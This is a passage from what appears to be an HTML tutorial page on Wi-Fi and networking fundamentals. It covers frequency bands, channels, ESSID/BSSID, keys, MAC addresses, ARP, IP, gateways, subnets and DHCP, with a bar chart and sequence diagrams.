&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Frequency bands&lt;/strong&gt; refer to specific ranges of &lt;strong&gt;radio frequencies&lt;/strong&gt; that are used for wireless communication. Wi-Fi operates in two main frequency bands: &lt;strong&gt;2.4 GHz&lt;/strong&gt; and &lt;strong&gt;5 GHz&lt;/strong&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;2.4 GHz&lt;/strong&gt;: The 2.4 GHz band is the older and more widely used frequency band in Wi-Fi. It provides good coverage and can obstacles like walls more effectively.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;5 GHz&lt;/strong&gt;: The 5 GHz band is a newer addition to Wi-Fi and offers more available channels with wider frequency ranges. It provides faster data speeds and is less congested compared to the 2.4 GHz band since fewer devices operate in this range. However, the 5 GHz signals have a shorter range and may encounter more attenuation when passing through walls and other obstacles.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="echarts" style="width: 100%; height: 30rem;"&gt;&lt;/div&gt;&lt;template data-fmt="js" data-async="false"&gt;{ color: [&amp;#39;#00BFFF&amp;#39;, &amp;#39;#FF7F50&amp;#39;], title: { text: &amp;#39;Wi-Fi Frequency Bands Overview&amp;#39;, top: &amp;#39;2%&amp;#39;, left: &amp;#39;center&amp;#39; }, tooltip: { trigger: &amp;#39;axis&amp;#39;, axisPointer: { type: &amp;#39;shadow&amp;#39;, label: { backgroundColor: &amp;#39;#6a7985&amp;#39; } }, formatter: function(params) { const defs = { &amp;#34;Coverage&amp;#34;: &amp;#34;Area where the Wi-Fi signal can be effectively received.&amp;#34;, &amp;#34;Channels&amp;#34;: &amp;#34;Number of available channels for data transmission.&amp;#34;, &amp;#34;Speed&amp;#34;: &amp;#34;Maximum theoretical data transmission speed.&amp;#34;, &amp;#34;Obstacle&amp;#34;: &amp;#34;Ability of the signal to pass through walls and obstacles.&amp;#34;, &amp;#34;Congestion&amp;#34;: &amp;#34;Level of interference caused by other devices.&amp;#34;, &amp;#34;Connectivity&amp;#34;: &amp;#34;Ease of connection without physical cables.&amp;#34;, &amp;#34;Portability&amp;#34;: &amp;#34;Ability to use Wi-Fi on mobile and portable devices.&amp;#34;, &amp;#34;Security&amp;#34;: &amp;#34;Level of data protection on the network (WPA2/WPA3).&amp;#34;, &amp;#34;Compatibility&amp;#34;: &amp;#34;Number of devices supporting this frequency band.&amp;#34;, &amp;#34;Range&amp;#34;: &amp;#34;Maximum distance at which the signal is usable.&amp;#34;, &amp;#34;Interference&amp;#34;: &amp;#34;Disturbances caused by other electronic devices.&amp;#34; }; let category = params[0].axisValue; let tooltipText = `&amp;lt;b&amp;gt;${category}&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;${defs[category]}&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;`; params.forEach(item =&amp;gt; { tooltipText &amp;#43;= `${item.marker} ${item.seriesName}: ${item.data}&amp;lt;br&amp;gt;`; }); return tooltipText; } }, legend: { data: [&amp;#39;2.4 GHz&amp;#39;, &amp;#39;5 GHz&amp;#39;], top: &amp;#39;10%&amp;#39; }, toolbox: { feature: { saveAsImage: {} } }, grid: { left: &amp;#39;5%&amp;#39;, right: &amp;#39;5%&amp;#39;, bottom: &amp;#39;10%&amp;#39;, top: &amp;#39;20%&amp;#39;, containLabel: true }, xAxis: { type: &amp;#39;category&amp;#39;, data: [ &amp;#34;Coverage&amp;#34;, &amp;#34;Channels&amp;#34;, &amp;#34;Speed&amp;#34;, &amp;#34;Obstacle&amp;#34;, &amp;#34;Congestion&amp;#34;, &amp;#34;Connectivity&amp;#34;, &amp;#34;Portability&amp;#34;, &amp;#34;Security&amp;#34;, &amp;#34;Compatibility&amp;#34;, &amp;#34;Range&amp;#34;, &amp;#34;Interference&amp;#34; ], axisLine: { lineStyle: { color: &amp;#39;#888&amp;#39; } }, axisTick: { alignWithLabel: true } }, yAxis: { type: &amp;#39;value&amp;#39;, max: 10, axisLine: { lineStyle: { color: &amp;#39;#888&amp;#39; } }, splitLine: { lineStyle: { type: &amp;#39;dashed&amp;#39;, color: &amp;#39;#ddd&amp;#39; } } }, series: [ { name: &amp;#39;2.4 GHz&amp;#39;, type: &amp;#39;bar&amp;#39;, barGap: 0, barCategoryGap: &amp;#39;40%&amp;#39;, emphasis: { focus: &amp;#39;series&amp;#39; }, data: [9, 3, 5, 8, 7, 10, 10, 7, 10, 9, 6], itemStyle: { color: &amp;#39;rgb(0, 191, 255)&amp;#39; } }, { name: &amp;#39;5 GHz&amp;#39;, type: &amp;#39;bar&amp;#39;, emphasis: { focus: &amp;#39;series&amp;#39; }, data: [6, 9, 9, 5, 3, 10, 10, 9, 10, 6, 4], itemStyle: { color: &amp;#39;rgb(255, 127, 80)&amp;#39; } } ] }&lt;/template&gt;&lt;h3 class="heading-element" id="channels"&gt;&lt;span&gt;38.4 Channels&lt;/span&gt;
 &lt;a href="#channels" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Channels&lt;/strong&gt; refer to specific &lt;strong&gt;frequencies&lt;/strong&gt; within the &lt;strong&gt;wireless spectrum&lt;/strong&gt; that are used for &lt;strong&gt;transmitting and receiving data&lt;/strong&gt;. Wi-Fi channels are &lt;strong&gt;divided&lt;/strong&gt; to reduce &lt;strong&gt;interference&lt;/strong&gt; and allow multiple networks to operate in &lt;strong&gt;close proximity&lt;/strong&gt; without conflicting with each other.&lt;/p&gt;
&lt;div class="alert alert-note"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;Each frequency band is divided into multiple channels, represented by numbers. For example, in the 2.4 GHz band, there are 11 channels available, usually numbered from 1 to 11. In the 5 GHz band, there are typically more channels available, such as 24 or more.
Channels in the 2.4 GHz band have a narrower frequency range and can partially overlap with each other. This means that neighboring Wi-Fi networks using nearby channels may experience interference, which can degrade the performance of both networks.&lt;/p&gt;&lt;/div&gt;&lt;h3 class="heading-element" id="essid"&gt;&lt;span&gt;38.5 ESSID&lt;/span&gt;
 &lt;a href="#essid" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;ESSID&lt;/strong&gt; stands for &lt;strong&gt;Extended Service Set Identifier&lt;/strong&gt;. It is the &lt;strong&gt;name assigned to a Wi-Fi network&lt;/strong&gt;. The ESSID acts as a &lt;strong&gt;unique identifier&lt;/strong&gt; that allows devices to &lt;strong&gt;differentiate between different wireless networks&lt;/strong&gt; in the vicinity. When you search for available Wi-Fi networks on your device, you see a list of &lt;strong&gt;ESSIDs&lt;/strong&gt; to choose from.&lt;/p&gt;
&lt;h3 class="heading-element" id="bssid"&gt;&lt;span&gt;38.6 BSSID&lt;/span&gt;
 &lt;a href="#bssid" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;BSSID&lt;/strong&gt; stands for &lt;strong&gt;Basic Service Set Identifier&lt;/strong&gt;. It is a &lt;strong&gt;unique identifier&lt;/strong&gt; assigned to each &lt;strong&gt;wireless access point (AP)&lt;/strong&gt; in a Wi-Fi network. Each access point in a Wi-Fi network has its own &lt;strong&gt;MAC (Media Access Control) address&lt;/strong&gt;, which is a &lt;strong&gt;unique identifier&lt;/strong&gt; assigned to the &lt;strong&gt;network interface&lt;/strong&gt; of the device. The BSSID is &lt;strong&gt;derived from the MAC address&lt;/strong&gt; of the access point.&lt;/p&gt;
&lt;h3 class="heading-element" id="bandwidth"&gt;&lt;span&gt;38.7 Bandwidth&lt;/span&gt;
 &lt;a href="#bandwidth" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bandwidth&lt;/strong&gt; in Wi-Fi refers to the &lt;strong&gt;maximum data transfer rate&lt;/strong&gt; or &lt;strong&gt;capacity&lt;/strong&gt; of a wireless network. It represents the &lt;strong&gt;amount of data&lt;/strong&gt; that can be transmitted over the network within a given time frame. Measured in &lt;strong&gt;Gigabits per second (Gbps)&lt;/strong&gt; or &lt;strong&gt;Megabits per second (Mbps)&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 class="heading-element" id="keypassphrase"&gt;&lt;span&gt;38.8 Key/Passphrase&lt;/span&gt;
 &lt;a href="#keypassphrase" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;A key refers to a cryptographic code or password used for authentication and encryption purposes to secure a wireless network&lt;/p&gt;
&lt;p&gt;There are two keys when working with WIFI :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Network Security Key:&lt;/strong&gt; Also known as a Wi-Fi password or passphrase, the network security key is used to authenticate a client device and grant access to the Wi-Fi network. When connecting to a secured Wi-Fi network, users are typically prompted to enter the network security key to prove their authorization. This key is used during the authentication phase of the Wi-Fi handshake process to establish a secure connection.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Encryption Key:&lt;/strong&gt; Once a client device is authenticated and connected to a Wi-Fi network, an encryption key is used to encrypt and decrypt the data transmitted over the network. This key ensures that the data exchanged between the client and the access point is secure and cannot be intercepted or understood by unauthorized parties. Different encryption protocols, such as WPA2 or WPA3, use different encryption keys and algorithms to protect the confidentiality and integrity of the Wi-Fi communication.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="some-neccessary-networking-concepts"&gt;&lt;span&gt;39 Some Neccessary Networking Concepts&lt;/span&gt;
 &lt;a href="#some-neccessary-networking-concepts" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="mac-address"&gt;&lt;span&gt;39.1 MAC Address&lt;/span&gt;
 &lt;a href="#mac-address" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;A &lt;strong&gt;MAC address&lt;/strong&gt; (Media Access Control address) is a &lt;strong&gt;unique identifier&lt;/strong&gt; assigned to &lt;strong&gt;network interfaces&lt;/strong&gt;, such as network cards or Ethernet ports.&lt;br&gt;
It is a &lt;strong&gt;48-bit&lt;/strong&gt; (6-byte) value expressed in &lt;strong&gt;hexadecimal format&lt;/strong&gt;, typically written in pairs separated by colons or hyphens.&lt;br&gt;
Example: &lt;code&gt;00:1A:2B:3C:4D:5E&lt;/code&gt; — the first half is the &lt;strong&gt;Organizationally Unique Identifier (OUI)&lt;/strong&gt; (identifies the &lt;strong&gt;manufacturer&lt;/strong&gt;), and the second half is the &lt;strong&gt;device-specific identifier&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 class="heading-element" id="arp"&gt;&lt;span&gt;39.2 ARP&lt;/span&gt;
 &lt;a href="#arp" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;ARP&lt;/strong&gt; stands for &lt;strong&gt;Address Resolution Protocol&lt;/strong&gt;. It is used in networks to &lt;strong&gt;map an IP address to a MAC address&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;When a device wants to communicate with another on the same network, it uses ARP to find the &lt;strong&gt;MAC address&lt;/strong&gt; of the destination by sending an &lt;strong&gt;ARP request&lt;/strong&gt;.&lt;/p&gt;
&lt;pre class="mermaid"&gt;sequenceDiagram
 participant PC1 as PC1 (Requester)
 participant Network as Network (Broadcast)
 participant PC2 as PC2 (Responder)

 PC1-&gt;&gt;Network: ARP Request (Who has IP 192.168.1.2?)
 Note over Network: Broadcast message to all devices
 Network-&gt;&gt;PC2: ARP Request

 PC2-&gt;&gt;Network: ARP Reply (The MAC address for 192.168.1.2 is 00:11:22:33:44:55)
 Network-&gt;&gt;PC1: ARP Reply

 PC1-&gt;&gt;PC2: Direct communication using found MAC address&lt;/pre&gt;
&lt;template&gt;sequenceDiagram
 participant PC1 as PC1 (Requester)
 participant Network as Network (Broadcast)
 participant PC2 as PC2 (Responder)

 PC1-&gt;&gt;Network: ARP Request (Who has IP 192.168.1.2?)
 Note over Network: Broadcast message to all devices
 Network-&gt;&gt;PC2: ARP Request

 PC2-&gt;&gt;Network: ARP Reply (The MAC address for 192.168.1.2 is 00:11:22:33:44:55)
 Network-&gt;&gt;PC1: ARP Reply

 PC1-&gt;&gt;PC2: Direct communication using found MAC address&lt;/template&gt;&lt;h3 class="heading-element" id="ip-address"&gt;&lt;span&gt;39.3 IP Address&lt;/span&gt;
 &lt;a href="#ip-address" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;An &lt;strong&gt;IP address&lt;/strong&gt; (Internet Protocol address) is a &lt;strong&gt;numerical label&lt;/strong&gt; assigned to each device connected to a network.&lt;/p&gt;
&lt;p&gt;It serves as a &lt;strong&gt;unique identifier&lt;/strong&gt;, allowing devices to &lt;strong&gt;send and receive data&lt;/strong&gt; over the internet or a private network.&lt;/p&gt;
&lt;h3 class="heading-element" id="gateway"&gt;&lt;span&gt;39.4 Gateway&lt;/span&gt;
 &lt;a href="#gateway" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;A &lt;strong&gt;gateway&lt;/strong&gt; is a device or system that serves as an &lt;strong&gt;entry point&lt;/strong&gt; between different networks.&lt;/p&gt;
&lt;p&gt;It &lt;strong&gt;forwards data packets&lt;/strong&gt; based on their destination and enables &lt;strong&gt;communication between networks&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 class="heading-element" id="router"&gt;&lt;span&gt;39.5 Router&lt;/span&gt;
 &lt;a href="#router" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;A &lt;strong&gt;router&lt;/strong&gt; is a networking device that &lt;strong&gt;connects multiple networks&lt;/strong&gt; and &lt;strong&gt;routes traffic&lt;/strong&gt; between them.&lt;/p&gt;
&lt;p&gt;It acts as a &lt;strong&gt;central hub&lt;/strong&gt; and makes decisions based on the &lt;strong&gt;destination address&lt;/strong&gt; of data packets.&lt;/p&gt;
&lt;h3 class="heading-element" id="subnet"&gt;&lt;span&gt;39.6 Subnet&lt;/span&gt;
 &lt;a href="#subnet" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;A &lt;strong&gt;subnet&lt;/strong&gt; (subnetwork) is a &lt;strong&gt;logical division&lt;/strong&gt; of an IP network.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Subnetting&lt;/strong&gt; improves &lt;strong&gt;network performance&lt;/strong&gt;, &lt;strong&gt;security&lt;/strong&gt;, and &lt;strong&gt;organization&lt;/strong&gt; by separating broadcast domains.&lt;/p&gt;
&lt;h3 class="heading-element" id="dhcp"&gt;&lt;span&gt;39.7 DHCP&lt;/span&gt;
 &lt;a href="#dhcp" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;DHCP&lt;/strong&gt; (Dynamic Host Configuration Protocol) is responsible for &lt;strong&gt;automatically assigning IP addresses&lt;/strong&gt; and other network settings to devices on a network.&lt;/p&gt;
&lt;pre class="mermaid"&gt;sequenceDiagram
 participant Client as Client (Device)
 participant Network as Network (Broadcast)
 participant DHCPServer as DHCP Server

 Client-&gt;&gt;Network: DHCP Discover (Looking for DHCP server)
 Network-&gt;&gt;DHCPServer: DHCP Discover

 DHCPServer-&gt;&gt;Network: DHCP Offer (IP address + config)
 Network-&gt;&gt;Client: DHCP Offer

 Client-&gt;&gt;Network: DHCP Request (Requesting offered IP)
 Network-&gt;&gt;DHCPServer: DHCP Request

 DHCPServer-&gt;&gt;Network: DHCP Acknowledgment (Confirm IP assigned)
 Network-&gt;&gt;Client: DHCP Acknowledgment

 Client-&gt;&gt;DHCPServer: Communication with assigned IP&lt;/pre&gt;
&lt;template&gt;sequenceDiagram
 participant Client as Client (Device)
 participant Network as Network (Broadcast)
 participant DHCPServer as DHCP Server

 Client-&gt;&gt;Network: DHCP Discover (Looking for DHCP server)
 Network-&gt;&gt;DHCPServer: DHCP Discover

 DHCPServer-&gt;&gt;Network: DHCP Offer (IP address + config)
 Network-&gt;&gt;Client: DHCP Offer

 Client-&gt;&gt;Network: DHCP Request (Requesting offered IP)
 Network-&gt;&gt;DHCPServer: DHCP Request

